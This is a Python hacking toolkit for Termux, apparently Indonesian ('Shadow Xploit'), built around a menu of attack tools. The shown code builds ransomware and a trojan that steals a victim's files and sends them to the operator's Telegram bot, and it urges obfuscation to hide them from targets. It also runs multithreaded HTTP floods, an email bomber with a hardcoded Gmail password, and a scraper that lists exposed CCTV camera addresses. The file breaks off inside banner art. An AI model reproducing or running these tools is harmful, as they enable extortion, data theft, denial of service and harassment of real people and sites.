#!/usr/bin/python
# -*- coding: utf-8 -*-
# Disclaimer: Script ini tidak disusun utk tujuan kriminalitas
# -------------------------------------------------
# Thanks to       : Allah SWT
# Author/Penyusun : Shadow Xploit
# Version         : 5.0.0
# Last Update     : 05-06-2026
# -------------------------------------------------
try:
    import useragent, os, sys, time, platform, requests, re, json, urllib, colorama, random, socket, threading, cloudscraper, shutil, string
    import requests as r
    from time import sleep
    from datetime import datetime
    from instaloader import instaloader
    from colorama import Fore, Style, init
    from requests.sessions import session
    from requests.exceptions import RequestException
    from requests.exceptions import SSLError
    from rich.panel import Panel
    from rich.console import Console
    from rich import print as rprint
    from rich import print as printf
    from rich.prompt import Prompt
    from itertools import zip_longest
except (ModuleNotFoundError) as e:
    __import__('sys').exit(f"[Error] {str(e).capitalize()}!")
BLUEBG  = "\033[48;5;17m\033[1;34m"
BLUE  = "\033[1;34m"
RED   = "\033[1;31m"
THINRED   = "\033[0;31m"
CYAN  = "\033[1;36m"
WHITE = "\033[1;37m"
THINWHITE = "\033[0;37m"
YELLOW = "\033[1;33m"
GREEN = "\033[1;32m"
TWINGREEN = "\033[0;32m"
RESET = "\033[0m"

def ransomware():
    print(f" {BLUE}Note{RED}: {RESET}Alat pembuat ransomware berbentuk python yang jika dieksekusi oleh target,\n akan langsung mengunci termuxnya dengan password.")
    os.system("cp node_modules/type/ㅤ/.t .")
    new_ransomware = input(f"\n {RED}[{WHITE}+{RED}] {BLUE}Nama Ransomware {RED}(ex. crackfb.py) {CYAN}: {THINWHITE}")
    os.system(f"mv .t {new_ransomware}")
    file_name = new_ransomware
    with open(file_name, 'r') as file:
        data = file.read()
    new_name = input(f"\n {RED}[{WHITE}+{RED}] {BLUE}Nickname anda {CYAN}: {THINWHITE}")
    new_password = input(f"\n {RED}[{WHITE}+{RED}] {BLUE}Password ransomware {CYAN}: {THINWHITE}")
    new_number = input(f"\n {RED}[{WHITE}+{RED}] {BLUE}Nomor anda {RED}(+62xxx) {CYAN}: {THINWHITE}")
    data = data.replace("Nick777x", new_name)
    data = data.replace("111", new_password)
    data = data.replace("+6283141494320", new_number)
    with open(file_name, 'w') as file:
        file.write(data)
    os.system(f"mv {new_ransomware} /sdcard")
    sleep(1)
    print(f"\n {RED}[{WHITE}+{RED}] {BLUE}Membuat ransomware...")
    sleep(1.5)
    print(f"\n {RED}[{WHITE}+{RED}] {BLUE}Cek file ransomware {THINWHITE}'{new_ransomware}' {BLUE}di memori internal!")
    sleep(0.5)
    print(f"\n {RED}[{WHITE}+{RED}] {BLUE}Jangan lupa di enkripsi/obfuscate, biar passwordnya gak kebaca!")
    sleep(0.5)
    
def trojan():
    print(f" {BLUE}Note{RED}: {RESET}Alat pembuat file trojan berbentuk python yang jika dieksekusi oleh target,\n akan langsung mencuri beberapa file target & mengirimkannya ke Telegram anda.")
    os.system("cp node_modules/type/ㅤ/.l .")
    new_ransomware = input(f"\n {RED}[{WHITE}+{RED}] {BLUE}Nama Trojan {RED}(ex. crackfb.py) {CYAN}: {THINWHITE}")
    os.system(f"mv .l {new_ransomware}")
    file_name = new_ransomware
    with open(file_name, 'r') as file:
        data = file.read()
    print(f"\n {RED}[{WHITE}+{RED}] {BLUE}Silakan buat Bot Telegram di {RESET}@BotFather {BLUE}lalu copy token botnya!")
    print(f" {RED}[{WHITE}+{RED}] {BLUE}Contoh {CYAN}: {THINWHITE}6721038380:AAEGIL3bUUcVsw3kGEh1eMi5x7GeIQXnQr0")
    new_token = input(f"\n {RED}[{WHITE}+{RED}] {BLUE}Bot Token Telegram {CYAN}: {THINWHITE}")
    print(f"\n {RED}[{WHITE}+{RED}] {BLUE}Ambil ID akun Telegram anda di {RESET}@getmyidx_bot {BLUE}dan paste di sini!")
    print(f" {RED}[{WHITE}+{RED}] {BLUE}Contoh {CYAN}: {THINWHITE}5726208271")
    new_id = input(f"\n {RED}[{WHITE}+{RED}] {BLUE}Chat ID {CYAN}: {THINWHITE}")
    data = data.replace("6721038380:AAEGIL3bUUcVsw3kGEh1eMi5x7GeIQXnQr0", new_token)
    data = data.replace("5726208271", new_id)
    with open(file_name, 'w') as file:
        file.write(data)
    os.system(f"mv {new_ransomware} /sdcard/{new_ransomware}")
    sleep(1)
    print(f"\n {RED}[{WHITE}+{RED}] {BLUE}Membuat trojan...")
    sleep(1.5)
    print(f"\n {RED}[{WHITE}+{RED}] {BLUE}Cek file trojan {THINWHITE}'{new_ransomware}' {BLUE}di memori internal!")
    sleep(0.5)
    print(f"\n {RED}[{WHITE}+{RED}] {BLUE}Jangan lupa di enkripsi/obfuscate, biar kodenya gak kebaca target!")
    sleep(0.5)
    
def bot_wa():
    print(f"\n {RED}[{WHITE}1{RED}] {CYAN}Start Bot WhatsApp")
    print(f" {RED}[{WHITE}2{RED}] {CYAN}Setting Bot")
    print(f" {RED}[{WHITE}0{RED}] {CYAN}Back To Menu")
    pilihan = input(f"\n {RED}[{WHITE}+{RED}] {BLUE}Choose {RED}: {WHITE}")
    if pilihan.endswith("1"):
        if os.path.isfile('.bot/settings.js'):
            os.system("cd .bot && node .")
        else:
            sleep(1)
            setting_bot()
    elif pilihan.endswith("2"):
        sleep(1)
        setting_bot()
    else:
        sleep(2)
        
def setting_bot():
    os.system("rm -rf ./.bot/session")
    os.system("cp node_modules/type/ㅤ/settings.js .bot")
    file_name = ".bot/settings.js"
    with open(file_name, 'r') as file:
        data = file.read()
    new_bot = input(f"\n {RED}[{WHITE}+{RED}] {BLUE}Nama Bot {CYAN}: {THINWHITE}")
    new_owner = input(f"\n {RED}[{WHITE}+{RED}] {BLUE}Nama Owner {CYAN}: {THINWHITE}")
    new_number = input(f"\n {RED}[{WHITE}+{RED}] {BLUE}Nomor Owner {RED}(62xxx) {CYAN}: {THINWHITE}")
    data = data.replace("Shadow Bot", new_bot)
    data = data.replace("Shadow Xploit", new_owner)
    data = data.replace("6283141494320", new_number)
    with open(file_name, 'w') as file:
        file.write(data)
    print(f"\n {RED}[{WHITE}+{RED}] {BLUE}Bot Telah Di Setting.")
    sleep(2)
    bot_wa()
    
def httpv1():
    import threading
    from colorama import Fore, Style, init
    init()
    def stress_test(url):
        num_threads = int(input(f" {RED}[{WHITE}+{RED}] {BLUE}Requests/second {RED}(ex. 100) {CYAN}: {THINWHITE}"))
        requests_per_second = int(input(f" {RED}[{WHITE}+{RED}] {BLUE}Threads {RED}(ex. 100) {CYAN}: {THINWHITE}"))
        def send_requests():
            requests_sent = 0
            session = requests.Session()
            try:
                while not stop_event.is_set():
                    session.get(url)
                    requests_sent += 1
                    print(f" {BLUE}Thread-{threading.current_thread().ident} Request {requests_sent} Berhasil" + Style.RESET_ALL)
                    sleep(1 / requests_per_second)
            except Exception as e:
                print(f" {RED}Thread-{threading.current_thread().ident} encountered an error: {e}")
            except KeyboardInterrupt:
                print(f" {RED}Exiting...")
                stop_event.set()
        stop_event = threading.Event()
        threads = []
        for _ in range(num_threads):
            thread = threading.Thread(target=send_requests)
            thread.start()
            threads.append(thread)
        try:
            print(f"\n {RED}[{WHITE}+{RED}] {BLUE}Press Ctr+Z to stop the attack\n")
            #Check result on https://check-host.net/check-http?host={url}\n")
        except KeyboardInterrupt:
            print(f" {RED}Exiting...")
            stop_event.set()
        for thread in threads:
            thread.join()
    if __name__ == "__main__":
        url = input(f"\n {RED}[{WHITE}+{RED}] {BLUE}URL {RED}(ex. https://en.cis.org.il) {CYAN}: {THINWHITE}")
        if ".id" in url:
           sleep(1)
           print(f"\n {RED}[{WHITE}-{RED}] {BLUE}Akses ditolak!!!\n")
           sleep(0.5)
           sys.exit()
        else:
           stress_test(url)
           
def httpv3():
    import threading
    def send_request(url):
        with open('user-agents.txt', 'r') as f:
            useragents = f.readlines()
        while True:
            try:
                user_agent = random.choice(useragents).strip()
                headers = {'User-Agent': user_agent}
                response = requests.get(url, headers=headers)
                print(f" {BLUE}Respon status web :", (response.status_code))
            except requests.exceptions.RequestException as e:
                print(f" {RED}Error :", e)
    if __name__ == "__main__":
        url = input(f"\n {RED}[{WHITE}+{RED}] {BLUE}Target {RED}(ex. https://en.cis.org.il) {CYAN}: {THINWHITE}")
        if ".id" in url:
            sleep(1)
            print(f"\n {RED}[{WHITE}-{RED}] {BLUE}Akses ditolak!!!\n")
            sleep(0.5)
            sys.exit()
        else:
            proxy_list = open('proxy.txt', 'r').readlines()
            proxies = {'http': None, 'https': None}
            for proxy in proxy_list:
                proxies['http'] = 'http://' + proxy.strip()
                proxies['https'] = 'https://' + proxy.strip()
                for i in range(500):
                    threading.Thread(target=send_request, args=(url,)).start()
                    
def ip_track():
    ip = input(f"\n {RED}[{WHITE}+{RED}] {BLUE}Enter Target IP {RED}: {RESET}")
    print(f"\n{THINWHITE}{'=' * 15} {CYAN}IP INFORMATION{THINWHITE} {'=' * 15}")
    try:
        req_api = requests.get(
            f"https://iplocate.io/api/lookup/{ip}",
            timeout=10
        )
        ip_data = req_api.json()
        print(f" {RED}[{WHITE}+{RED}] {BLUE}Target IP        {RED}: {WHITE}{ip_data.get('ip')}")
        sleep(0.1)
        print(f" {RED}[{WHITE}+{RED}] {BLUE}Country          {RED}: {WHITE}{ip_data.get('country')}")
        sleep(0.1)
        print(f" {RED}[{WHITE}+{RED}] {BLUE}Country Code     {RED}: {WHITE}{ip_data.get('country_code')}")
        sleep(0.1)
        print(f" {RED}[{WHITE}+{RED}] {BLUE}City             {RED}: {WHITE}{ip_data.get('city')}")
        sleep(0.1)
        print(f" {RED}[{WHITE}+{RED}] {BLUE}Subdivision      {RED}: {WHITE}{ip_data.get('subdivision')}")
        sleep(0.1)
        print(f" {RED}[{WHITE}+{RED}] {BLUE}Continent        {RED}: {WHITE}{ip_data.get('continent')}")
        sleep(0.1)
        print(f" {RED}[{WHITE}+{RED}] {BLUE}Latitude         {RED}: {WHITE}{ip_data.get('latitude')}")
        sleep(0.1)
        print(f" {RED}[{WHITE}+{RED}] {BLUE}Longitude        {RED}: {WHITE}{ip_data.get('longitude')}")
        sleep(0.1)
        print(f" {RED}[{WHITE}+{RED}] {BLUE}Postal Code      {RED}: {WHITE}{ip_data.get('postal_code')}")
        sleep(0.1)
        print(f" {RED}[{WHITE}+{RED}] {BLUE}Time Zone        {RED}: {WHITE}{ip_data.get('time_zone')}")
        sleep(0.1)
        print(f" {RED}[{WHITE}+{RED}] {BLUE}Currency Code    {RED}: {WHITE}{ip_data.get('currency_code')}")
        sleep(0.1)
        print(f" {RED}[{WHITE}+{RED}] {BLUE}Calling Code     {RED}: {WHITE}{ip_data.get('calling_code')}")
        sleep(0.1)
        print(f" {RED}[{WHITE}+{RED}] {BLUE}European Union   {RED}: {WHITE}{ip_data.get('is_eu')}")
        sleep(0.1)
        print(f" {RED}[{WHITE}+{RED}] {BLUE}Anycast          {RED}: {WHITE}{ip_data.get('is_anycast')}")
        sleep(0.1)
        print(f" {RED}[{WHITE}+{RED}] {BLUE}Satellite        {RED}: {WHITE}{ip_data.get('is_satellite')}")
        sleep(0.1)
        print(f"\n{THINWHITE}{'=' * 14} {CYAN}ASN INFORMATION{THINWHITE} {'=' * 14}")
        print(f" {RED}[{WHITE}+{RED}] {BLUE}ASN              {RED}: {WHITE}{ip_data['asn'].get('asn')}")
        sleep(0.1)
        print(f" {RED}[{WHITE}+{RED}] {BLUE}Route            {RED}: {WHITE}{ip_data['asn'].get('route')}")
        sleep(0.1)
        print(f" {RED}[{WHITE}+{RED}] {BLUE}Netname          {RED}: {WHITE}{ip_data['asn'].get('netname')}")
        sleep(0.1)
        print(f" {RED}[{WHITE}+{RED}] {BLUE}ASN Name         {RED}: {WHITE}{ip_data['asn'].get('name')}")
        sleep(0.1)
        print(f" {RED}[{WHITE}+{RED}] {BLUE}ASN Domain       {RED}: {WHITE}{ip_data['asn'].get('domain')}")
        sleep(0.1)
        print(f" {RED}[{WHITE}+{RED}] {BLUE}ASN Type         {RED}: {WHITE}{ip_data['asn'].get('type')}")
        sleep(0.1)
        print(f" {RED}[{WHITE}+{RED}] {BLUE}RIR              {RED}: {WHITE}{ip_data['asn'].get('rir')}")
        sleep(0.1)
        print(f"\n{THINWHITE}{'=' * 15} {CYAN}PRIVACY CHECK{THINWHITE} {'=' * 15}")
        print(f" {RED}[{WHITE}+{RED}] {BLUE}Hosting          {RED}: {WHITE}{ip_data['privacy'].get('is_hosting')}")
        sleep(0.1)
        print(f" {RED}[{WHITE}+{RED}] {BLUE}VPN              {RED}: {WHITE}{ip_data['privacy'].get('is_vpn')}")
        sleep(0.1)
        print(f" {RED}[{WHITE}+{RED}] {BLUE}Proxy            {RED}: {WHITE}{ip_data['privacy'].get('is_proxy')}")
        sleep(0.1)
        print(f" {RED}[{WHITE}+{RED}] {BLUE}TOR              {RED}: {WHITE}{ip_data['privacy'].get('is_tor')}")
        sleep(0.1)
        print(f" {RED}[{WHITE}+{RED}] {BLUE}Anonymous        {RED}: {WHITE}{ip_data['privacy'].get('is_anonymous')}")
        sleep(0.1)
        print(f"\n{THINWHITE}{'=' * 15} {CYAN}COMPANY INFO{THINWHITE} {'=' * 15}")
        print(f" {RED}[{WHITE}+{RED}] {BLUE}Company Name     {RED}: {WHITE}{ip_data['company'].get('name')}")
        sleep(0.1)
        print(f" {RED}[{WHITE}+{RED}] {BLUE}Company Domain   {RED}: {WHITE}{ip_data['company'].get('domain')}")
        sleep(0.1)
        print(f" {RED}[{WHITE}+{RED}] {BLUE}Company Type     {RED}: {WHITE}{ip_data['company'].get('type')}")
        sleep(0.1)
        print(f"\n{THINWHITE}{'=' * 15} {CYAN}ABUSE CONTACT{THINWHITE} {'=' * 15}")
        print(f" {RED}[{WHITE}+{RED}] {BLUE}Abuse Name       {RED}: {WHITE}{ip_data['abuse'].get('name')}")
        sleep(0.1)
        print(f" {RED}[{WHITE}+{RED}] {BLUE}Abuse Email      {RED}: {WHITE}{ip_data['abuse'].get('email')}")
        sleep(0.1)
        print(f" {RED}[{WHITE}+{RED}] {BLUE}Abuse Address    {RED}: {WHITE}{ip_data['abuse'].get('address')}")
        sleep(0.1)
        print(f" {RED}[{WHITE}+{RED}] {BLUE}Network Range    {RED}: {WHITE}{ip_data['abuse'].get('network')}")
        sleep(0.1)
        lat = ip_data.get("latitude")
        lon = ip_data.get("longitude")
        print(
            f" {RED}[{WHITE}+{RED}] {BLUE}Google Maps      {RED}: "
            f"{WHITE}https://www.google.com/maps/place/{lat},{lon}/@{lat},{lon},17z"
        )
        print()
    except Exception as e:
        print(
            f"\n {RED}[{WHITE}!{RED}] {BLUE}Error {RED}: {WHITE}{e}"
        )
        
def termux_banner():
    os.system("cp node_modules/type/ㅤ/.sh .")
    file_name = '.sh'
    with open(file_name, 'r') as file:
        data = file.read()
    print(f"\n {RED}[{WHITE}1{RED}] {CYAN}Linux")
    print(f" {RED}[{WHITE}2{RED}] {CYAN}Kali Linux")
    print(f" {RED}[{WHITE}3{RED}] {CYAN}Arch Linux")
    print(f" {RED}[{WHITE}4{RED}] {CYAN}Black Arch")
    print(f" {RED}[{WHITE}5{RED}] {CYAN}Debian")
    print(f" {RED}[{WHITE}6{RED}] {CYAN}Ubuntu")
    print(f" {RED}[{WHITE}7{RED}] {CYAN}KaOS")
    print(f" {RED}[{WHITE}8{RED}] {CYAN}Android")
    print(f" {RED}[{WHITE}9{RED}] {CYAN}MacOS")
    pilihan = input(f"\n {RED}[{WHITE}+{RED}] {BLUE}Choose Logo {RED}: {WHITE}")
    if pilihan.endswith("1"):
        logo = "Linux"
    elif pilihan.endswith("2"):
        logo = "KaliLinux"
    elif pilihan.endswith("3"):
        logo = "ArchLinux"
    elif pilihan.endswith("4"):
        logo = "BlackArch"
    elif pilihan.endswith("5"):
        logo = "debian"
    elif pilihan.endswith("6"):
        logo = "ubuntu"
    elif pilihan.endswith("7"):
        logo = "kaos"
    elif pilihan.endswith("8"):
        logo = "Android"
    elif pilihan.endswith("9"):
        logo = "MacOS"
    new_name = input(f"\n {RED}[{WHITE}+{RED}] {BLUE}Nicname {RED}: {THINWHITE}")
    
    #new_address = input(f"\n {RED}[{WHITE}+{RED}] {BLUE}Komunitas {RED}(ex. D A R K  X P L O I T E R) {CYAN}: {THINWHITE}")
    data = data.replace("dark", new_name)
    data = data.replace("BlackArch", logo)
    #data = data.replace("D A R K  X P L O I T E R", new_address)
    with open(file_name, 'w') as file:
        file.write(data)
    os.system("mv .sh $HOME/../usr/etc/bash.bashrc")
    sleep(1)
    print(f"\n {RED}[{WHITE}+{RED}] {CYAN}Selesai")
    sleep(0.5)
    print(f"\n {RED}[{WHITE}+{RED}] {BLUE}Ketik {RED}login {BLUE}untuk mencoba!")

def cctv2():
    from requests.structures import CaseInsensitiveDict
    colorama.init()
    url = "http://www.insecam.org/en/jsoncountries/"
    headers = CaseInsensitiveDict()
    headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
    headers["Cache-Control"] = "max-age=0"
    headers["Connection"] = "keep-alive"
    headers["Host"] = "www.insecam.org"
    headers["Upgrade-Insecure-Requests"] = "1"
    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"

    resp = requests.get(url, headers=headers)
    data = resp.json()
    countries = data['countries']
    print(f"""{RED}  _________________   __  __ ___   _          __  
 / ___/ ___/_  __/ | / / / // (_) (_)__ _____/ /_____ ____
{WHITE}/ /__/ /__  / /  | |/ / / _  / / / / _ `/ __/  '_/ -_) __/
\\___/\\___/ /_/   |___/ /_//_/_/_/ /\\_,_/\\__/_/\\_\\\\__/_/ 
                             |___/{RED}By AngelSecurityTeam
 {WHITE}List Country Codes {RED}:
""")
    for key, value in countries.items():
        print(f' {RED}({WHITE}{key}{RED}) - {WHITE}{value["country"]} {RED}/ ({WHITE}{value["count"]}{RED})  ')
        #print("")
        
    try:
        country = input(f" {WHITE}Country Code {RED}({WHITE}##{RED}) : {WHITE}")
        res = requests.get(
            f"http://www.insecam.org/en/bycountry/{country}", headers=headers
        )
        last_page = re.findall(r'pagenavigator\("\?page=", (\d+)', res.text)[0]
        for page in range(int(last_page)):
            res = requests.get(
                f"http://www.insecam.org/en/bycountry/{country}/?page={page}",
                headers=headers
            )
            find_ip = re.findall(r"http://\d+.\d+.\d+.\d+:\d+", res.text)
    
            with open(f'{country}.txt', 'w') as f:
              for ip in find_ip:
                  print("")
                  print(f"{RED}", ip)
                  f.write(f'{ip}\n')
    except:
        pass
    finally:
        print(f'\n {THINWHITE}Save File :'+country+'.txt')
        
def email_sender():
    import time, os, random, sys, json, argparse, requests, smtplib, time
    import subprocess as subp
    import logging
    logger = logging.getLogger('dev')
    logger.setLevel(logging.INFO)
    fileHandler = logging.FileHandler('spammer.log')
    fileHandler.setLevel(logging.INFO)
    consoleHandler = logging.StreamHandler()
    consoleHandler.setLevel(logging.INFO)
    logger.addHandler(fileHandler)
    logger.addHandler(consoleHandler)
    #logger.info('Email Spammer - Started!')
    row = []
    info = ''
    result = ''
    systemR = '1.7.4'
    def exit_error():
        print(f'{RED}Works only with Gmail.')
        sys.exit()
    # gmail   : port = 587 , smtp_server = smtp.gmail.com
    # outlook : port = 465 , smtp_server = smtp-mail.outlook.com
    # yahoo   : port = 587 , smtp_server = smpt.mail.yahoo.com
    # hotmail : port = 587 , smtp_server = smtp-mail.outlook.com
    # Yandex  : port = 465 , smtp_server = smtp.yandex.com
    # MailRu  : port = 587 , smtp_server = smtp.mail.ru
    GMAIL_PORT = "587"
    GMAIL_SSL_PORT = "465"
    YAHOO_PORT = "587"
    OUTLOOK_PORT = "587"
    AOL_PORT = "587"
    MAILRU_PORT = "465"
    def start_bomb():
            print(f'''
{RED}[{WHITE}>{RED}] {BLUE}Prepare for spam and attack ...''')
    print(f"{BLUE}Note{RED}: {THINWHITE}Buy full version on Telegram @ubp2q")
    print(f'''{RED}
.::.: EmailSpammer V1.7.4 Coded By Misha Korzhik :.::.''')
    print(f'''
{RED}[{WHITE}1{RED}] {CYAN}Start Email Spammer
{RED}[{WHITE}0{RED}] {CYAN}Exit
''')
    try:
            server = input(f'{RED}[{WHITE}+{RED}] {BLUE}Choose Menu  {RED}: {WHITE}')
            if server == '0' or server == '00' or server == 'exit' or server == 'Exit' or server == 'quit' or server == 'Quit':
                    print(f'{RED}[{WHITE}!{RED}] {YELLOW}Program dihentikan{RESET}')
                    sys.exit()
            elif server == '1' or server == '01' or server == 'gmail' or server == 'Gmail':
                    user = 'jiki.mioli08@gmail.com'
                    to = input(f'\n{RED}[{WHITE}+{RED}] {BLUE}Email Target {RED}: {THINWHITE}')
                    subject = input(f'\n{RED}[{WHITE}+{RED}] {BLUE}Judul Pesan  {RED}: {THINWHITE}')
                    body = input(f'\n{RED}[{WHITE}+{RED}] {BLUE}Isi Pesan    {RED}: {THINWHITE}')
                    delay = input(f'\n{RED}[{WHITE}+{RED}] {BLUE}Delay  (1-5) {RED}: {THINWHITE}')
                    nomes = int(input(f'\n{RED}[{WHITE}+{RED}] {BLUE}Jumlah (1-30){RED}: {THINWHITE}'))
                    en0 = 600
                    if en0 <= nomes:
                            print(f'{RED}denied access: Error \nsending maximum number 599')
                            sleep(2)
                            os.execl(sys.executable, sys.executable, *sys.argv)
            elif server == '2' or server == '02' or server == 'buy' or server == 'Buy':
                    print(f"{YELLOW}15$ (USD) - 50 emails per 12th. For 1 week")
                    print("30$ (USD) - 100 emails per 12th. For 1 week")
                    print("50$ (USD) - 200 emails per 12th. For 1 week")
                    print("85$ (USD) - 400 emails per 12th. For 1 week")
                    print("")
                    print("if you want to buy, write to Telegram @ubp2q")
                    exit()
            no = 0
            if to == 'misakorzik528@gmail.com' or to == 'miguardzecurity@gmail.com' or to == 'korzikmisha@gmail.com':
                    print(f'{RED}\nWhat?  seems to have failed to process \nyour request, please try another email.{RESET}')
                    sys.exit(0)
            if delay == '1' or delay == '01':
                    SPEED = .1
                    delay_name = 'fast'
            elif delay == '2' or delay == '02':
                    SPEED = .3
                    delay_name = 'medium'
            elif delay == '3' or delay == '03':
                    SPEED = .5
                    delay_name = 'slow'
            elif delay == '4' or delay == '04':
                    SPEED = .7
                    delay_name = 'unhurried'
            elif delay == '5' or delay == '05':
                    SPEED = .9
                    delay_name = 'snail'
            else:
                    SPEED = .3
                    delay_name = 'default'
            message = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
    except KeyboardInterrupt:
            print(f'{RED}Canceled! Quiting ...{RESET}')
            sys.exit()
    if server == '1' or server == '01' or server == 'gmail' or server == 'Gmail':
            pwd = "gzwjsohldzxdpteh"
            start_bomb()
            print(f'{THINWHITE}Email : ' + user + '\nTarget: ' + to + '\nSpeed : ' + delay_name)
            print("")
            server = smtplib.SMTP("smtp.gmail.com", GMAIL_PORT)
            print(f'{YELLOW}Starting TLS - server0.starttls()')
            server.starttls()
            try:
                    print(f'\n{YELLOW}Connecting - server0.login(u,p)\n{RESET}')
                    server.login(user, pwd)
            except smtplib.SMTPAuthenticationError:
                    try:
                            print(f'{YELLOW}Reconnecting - server0.login(u,p)')
                            server.login(user, pwd)
                    except smtplib.SMTPAuthenticationError:
                            try:
                                    print(f'{YELLOW}Reconnecting - server0.login(u,p)')
                                    server.login(user, pwd)
                            except smtplib.SMTPAuthenticationError:
                                    print(f'{YELLOW}Error to connect! Please use a mini version, select option 5...')
                                    sys.exit()
            for i in range(1, nomes+1):
                    logger.info('')
                    try:
                            server.sendmail(user, to, message)
                            print(f'{YELLOW}Successfully messenge sent! ' + str(no+1) + ' emails')
                            no += 1
                            sleep(SPEED)
                    except KeyboardInterrupt:
                            print(f'{RED}\nTerminaling...{RESET}')
                            sys.exit()
                    except:
                            server.sendmail(user, to, message)
                            print(f'{YELLOW}Successfully messenge sent! ' + str(no+1) + ' emails')
                            no += 1
                            sleep(SPEED)
            server.close()
    else:
        exit_error()
        
def tts():
    import gtts, os
    from gtts.lang import tts_langs
    def text_to_speech(text, lang='id'):
        if lang not in tts_langs():
            raise ValueError(f"Kode bahasa '{lang}' tidak valid.")
        tts = gtts.gTTS(text, lang=lang)
        return tts
    text = input(f"\n {RED}[{WHITE}+{RED}] {BLUE}Masukkan teks {CYAN}: {THINWHITE}")
    lang = input(f"\n {RED}[{WHITE}+{RED}] {BLUE}Masukkan kode bahasa {RED}(en,id) {CYAN}: {THINWHITE}")
    tts = text_to_speech(text, lang)
    hasil = input(f"\n {RED}[{WHITE}+{RED}] {BLUE}Masukkan nama file {RED}(tes.mp3) {CYAN}: {THINWHITE}")
    tts.save(f"/sdcard/{hasil}")
    print(f"\n {RED}[{WHITE}+{RED}] {BLUE}File {THINWHITE}'{hasil}' {BLUE}tersimpan di memori internal!")
    
def loading():
    animation = [
        "[\033[1;31m■\033[0m□□□□□□□□□]",
        "[\033[1;32m■■\033[0m□□□□□□□□]",
        "[\033[1;33m■■■\033[0m□□□□□□□]",
        "[\033[1;34m■■■■\033[0m□□□□□□]",
        "[\033[1;35m■■■■■\033[0m□□□□□]",
        "[\033[1;36m■■■■■■\033[0m□□□□]",
        "[\033[1;30m■■■■■■■\033[0m□□□]",
        "[\033[1;31m■■■■■■■■\033[0m□□]",
        "[\033[1;32m■■■■■■■■■\033[0m□]",
        "[\033[1;37m■■■■■■■■■■\033[0m]",
    ]
    for i in range(50):
        sleep(0.1)
        sys.stdout.write(
            f"\r {RED}[{WHITE}+{RED}] {BLUE}Checking   {RED}:{RESET} " + animation[i % len(animation)] + "{RESET} "
        )
        sys.stdout.flush()
        
def logo():
     #print(
     {'''{RED}
           \\.   \\.      __,-"-.__      ./   ./
       \\.   \\`.  \\`.-'"" _,="=._ ""`-'./  .'/   ./
        \\`.  \\_`-''      _,="=._      ``-'_/  .'/
         \\ `-',-._   _.  _,="=._  ,_   _.-,`-' /
      \\. /`,-',-._\"""  \\ _,="=._ /  """_.-,`-,'\\ ./
       \\`-'  /    `-._  "       "  _.-'    \\  `-'/
       /)   (         \\    ,-.    /         )   (\\\\
    ,-'"     `-.       \\  /   \\  /       .-'     "`-,
  ,'_._         `-.____/ /  _  \\ \\____.-'         _._`,
 /,'   `.                \\_/ \\_/                .'   `,\\\\
/'       )                  _                  (       `\\\\
        /   _,-'"`-.  ,++|T|||T|++.  .-'"`-,_   \\\\
       / ,-'        \\/|`|`|`|'|'|'|\\/        `-, \\\\
      /,'             | | | | | | |             `,\\\\
     /'               ` | | | | | '               `\\\\
                        ` | | | '
                          ` | '
     '''}
     #)
     left = [
         ("01", "LAYER 7 DDOS ATTACK"),
         ("02", "LAYER 4 DDOS ATTACK"),
         ("03", "VULNERABILITY SCANNER (MANUAL)"),
         ("04", "VULNERABILITY SCANNER (AUTO)"),
         ("05", "DOMAIN / IP SCANNER"),
         ("06", "SITE FILE SCRAPER"),
         ("07", "SITE EMAIL SCRAPER"),
         ("08", "SITE VISITOR"),
         ("09", "RDP KALI LINUX SSH"),
         ("10", "WIFI STRESSER"),
         ("11", "IP LOOKUP"),
         ("12", "LINUX STYLE (FOR TERMUX)"),
         ("13", "BRUTEFORCE ZIP PASSWORD"),
         ("14", "USERNAME TRACKER")
     ]
     right = [
         ("15", "SPAM OTP WHATSAPP"),
         ("16", "SPAM SENDER EMAIL"),
         ("17", "SPAM BUG API TELEGRAM"),
         ("18", "SPAM MAIL MOBILE LEGENDS"),
         ("19", "APK SENDER BUG WHATSAPP"),
         ("20", "WHATSAPP WEB CLI"),
         ("21", "NMAP CCTV SCANNER"),
         ("22", "TROJAN TERMUX GENERATOR"),
         ("23", "RANSOMWARE TERMUX GENERATOR"),
         ("24", "PYTHON OBFUSCATOR"),
         ("25", "JAVASCRIPT OBFUSCATOR"),
         ("26", "NIK CHECKER"),
         ("27", "BOT WHATSAPP FULL FITUR"),
         ("00", "EXIT PROGRAM")
     ]
     
     COL_WIDTH = 35
     
     print(f""" {BLUE}██████{CYAN}╗  {BLUE}█████{CYAN}╗ {BLUE}██████{CYAN}╗ {BLUE}██{CYAN}╗  {BLUE}██{CYAN}╗    {BLUE}██{CYAN}╗  {BLUE}██{CYAN}╗{BLUE}██████{CYAN}╗ {BLUE}██{CYAN}╗      {BLUE}██████{CYAN}╗ {BLUE}██{CYAN}╗{BLUE}████████{CYAN}╗
 {BLUE}██{CYAN}╔══{BLUE}██{CYAN}╗{BLUE}██{CYAN}╔══{BLUE}██{CYAN}╗{BLUE}██{CYAN}╔══{BLUE}██{CYAN}╗{BLUE}██{CYAN}║ {BLUE}██{CYAN}╔╝    ╚{BLUE}██{CYAN}╗{BLUE}██{CYAN}╔╝{BLUE}██{CYAN}╔══{BLUE}██{CYAN}╗{BLUE}██{CYAN}║     {BLUE}██{CYAN}╔═══{BLUE}██{CYAN}╗{BLUE}██{CYAN}║╚══{BLUE}██{CYAN}╔══╝
 {BLUE}██{CYAN}║  {BLUE}██{CYAN}║{BLUE}███████{CYAN}║{BLUE}██████{CYAN}╔╝{BLUE}█████{CYAN}╔╝      ╚{BLUE}███{CYAN}╔╝ {BLUE}██████{CYAN}╔╝{BLUE}██{CYAN}║     {BLUE}██{CYAN}║   {BLUE}██{CYAN}║{BLUE}██{CYAN}║   {BLUE}██{CYAN}║
 {BLUE}██{CYAN}║  {BLUE}██{CYAN}║{BLUE}██{CYAN}╔══{BLUE}██{CYAN}║{BLUE}██{CYAN}╔══{BLUE}██{CYAN}╗{BLUE}██{CYAN}╔═{BLUE}██{CYAN}╗      {BLUE}██{CYAN}╔{BLUE}██{CYAN}╗ {BLUE}██{CYAN}╔═══╝ {BLUE}██{CYAN}║     {BLUE}██{CYAN}║   {BLUE}██{CYAN}║{BLUE}██{CYAN}║   {BLUE}██{CYAN}║
